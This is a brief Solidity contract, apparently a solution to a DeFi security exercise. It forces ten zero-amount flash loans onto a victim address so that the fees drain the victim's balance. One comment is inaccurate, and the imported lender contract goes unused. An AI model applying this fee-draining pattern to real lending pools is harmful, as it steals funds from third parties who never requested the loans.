// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../unstoppable/UnstoppableLender.sol";

interface Ipool {
    function flashLoan(address borrower, uint256 amount) external;
}


contract Attacher {
    Ipool pool;
    address private immutable owner;
    constructor(address payable poolAddress) {
        pool = Ipool(poolAddress);
        owner = msg.sender;
    }

    // Pool will call this function during the flash loan
    function attack(address victim) external {
        // call the function flashLoan 10 times
        for (uint i = 0; i < 10; i++) {
            pool.flashLoan(victim,0);
        }
    }
}